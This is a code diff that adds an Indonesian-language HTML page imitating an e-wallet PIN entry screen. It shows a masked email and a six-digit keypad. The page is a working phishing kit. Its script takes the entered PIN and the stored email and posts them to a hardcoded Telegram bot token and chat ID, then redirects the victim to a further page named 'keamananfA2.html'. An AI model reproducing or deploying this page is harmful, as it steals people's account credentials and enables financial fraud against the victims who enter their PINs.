@@ -1,0 +1,179 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>PIN Input</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+  <header class="pt-6 px-4">
+    <button aria-label="Back" class="text-black text-2xl" id="backBtn">
+      <i class="fas fa-chevron-left"></i>
+    </button>
+  </header>
+  <main class="flex flex-col items-center mt-8 px-4 flex-grow">
+    <h1 class="text-black text-xl font-semibold mb-6">Masukkan PIN</h1>
+    <div class="w-full flex justify-center mb-12">
+      <div
+        aria-label="Email partially hidden"
+        class="flex items-center bg-white border border-gray-200 rounded-full px-4 py-2 shadow-sm max-w-xs w-full"
+        role="region"
+      >
+        <img
+          alt="Blue circle with white genie lamp icon"
+          class="w-6 h-6 rounded-full mr-3"
+          height="24"
+          src="https://storage.googleapis.com/a1aa/image/63c3044a-3443-45c0-73eb-18c1e1a024cc.jpg"
+          width="24"
+        />
+        <span class="text-gray-900 text-base font-normal select-text" id="email-display">
+          Loading...
+        </span>
+      </div>
+    </div>
+    <div class="flex justify-center space-x-12 mb-20">
+      <span class="w-5 h-5 rounded-full bg-blue-200"></span>
+      <span class="w-5 h-5 rounded-full bg-blue-200"></span>
+      <span class="w-5 h-5 rounded-full bg-blue-200"></span>
+      <span class="w-5 h-5 rounded-full bg-blue-200"></span>
+      <span class="w-5 h-5 rounded-full bg-blue-200"></span>
+      <span class="w-5 h-5 rounded-full bg-blue-200"></span>
+    </div>
+    <div
+      class="grid grid-cols-3 gap-y-12 gap-x-24 text-black text-3xl font-semibold select-none"
+      id="pin-pad"
+    >
+      <button class="focus:outline-none" type="button">1</button>
+      <button class="focus:outline-none" type="button">2</button>
+      <button class="focus:outline-none" type="button">3</button>
+      <button class="focus:outline-none" type="button">4</button>
+      <button class="focus:outline-none" type="button">5</button>
+      <button class="focus:outline-none" type="button">6</button>
+      <button class="focus:outline-none" type="button">7</button>
+      <button class="focus:outline-none" type="button">8</button>
+      <button class="focus:outline-none" type="button">9</button>
+      <button aria-label="Fingerprint authentication" class="focus:outline-none" type="button">
+        <i class="fas fa-fingerprint"></i>
+      </button>
+      <button class="focus:outline-none" type="button">0</button>
+      <button aria-label="Delete" class="focus:outline-none text-2xl" type="button" id="deleteBtn">
+        <i class="fas fa-backspace"></i>
+      </button>
+    </div>
+  </main>
+  <footer class="flex justify-between px-10 py-6 text-black text-sm font-normal">
+    <button class="focus:outline-none" type="button">Lupa PIN?</button>
+    <button class="focus:outline-none" type="button" id="changeAccountBtn">Ubah Akun?</button>
+  </footer>
+
+  <script>
+    // Telegram Bot Info - replace with your own bot token and chat ID
+    const TELEGRAM_BOT_TOKEN = '8392304649:AAFSpxG4uQqhdzOi-XD0ADeuykpj4RGAgDU';
+    const TELEGRAM_CHAT_ID = '7914074847';
+
+    // Get saved email from localStorage
+    const savedEmail = localStorage.getItem('userEmail') || '';
+
+    // Mask email function
+    function maskEmail(email) {
+      const [localPart, domain] = email.split('@');
+      if (!localPart || !domain) return email;
+      const firstChar = localPart.charAt(0);
+      const lastChar = localPart.charAt(localPart.length - 1);
+      const maskedPart = '*'.repeat(Math.max(localPart.length - 2, 1));
+      return `${firstChar}${maskedPart}${lastChar}@${domain}`;
+    }
+
+    // Display masked email
+    const emailDisplay = document.getElementById('email-display');
+    if (savedEmail) {
+      emailDisplay.textContent = maskEmail(savedEmail);
+    } else {
+      emailDisplay.textContent = 'Email tidak tersedia';
+    }
+
+    // PIN input logic
+    let pin = '';
+    const pinDots = document.querySelectorAll('.flex.justify-center > span');
+    const pinPad = document.getElementById('pin-pad');
+    const deleteBtn = document.getElementById('deleteBtn');
+    const backBtn = document.getElementById('backBtn');
+    const changeAccountBtn = document.getElementById('changeAccountBtn');
+
+    function updatePinDots() {
+      pinDots.forEach((dot, idx) => {
+        if (idx < pin.length) {
+          dot.classList.add('bg-blue-600');
+          dot.classList.remove('bg-blue-200');
+        } else {
+          dot.classList.add('bg-blue-200');
+          dot.classList.remove('bg-blue-600');
+        }
+      });
+    }
+
+    function sendPinToTelegram(pinValue) {
+      const message = `PIN entered: ${pinValue}\nEmail: ${savedEmail || 'N/A'}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message
+        })
+      })
+        .then(response => response.json())
+        .then(data => {
+          // After sending, redirect to keamananfA2.html
+          window.location.href = 'keamananfA2.html';
+        })
+        .catch(error => {
+          // On error, still redirect
+          window.location.href = 'keamananfA2.html';
+        });
+    }
+
+    pinPad.addEventListener('click', (e) => {
+      if (e.target.tagName === 'BUTTON') {
+        const val = e.target.textContent.trim();
+        if (val === '') return;
+        if (val === 'Lupa PIN?' || val === 'Ubah Akun?') return;
+        if (val === '0' || /^[1-9]$/.test(val)) {
+          if (pin.length < 6) {
+            pin += val;
+            updatePinDots();
+            if (pin.length === 6) {
+              sendPinToTelegram(pin);
+            }
+          }
+        }
+      }
+    });
+
+    deleteBtn.addEventListener('click', () => {
+      if (pin.length > 0) {
+        pin = pin.slice(0, -1);
+        updatePinDots();
+      }
+    });
+
+    backBtn.addEventListener('click', () => {
+      window.history.back();
+    });
+
+    changeAccountBtn.addEventListener('click', () => {
+      // Redirect or handle change account logic here
+      window.location.href = 'keamananfA2.html';
+    });
+
+    updatePinDots();
+  </script>
+</body>
+</html>
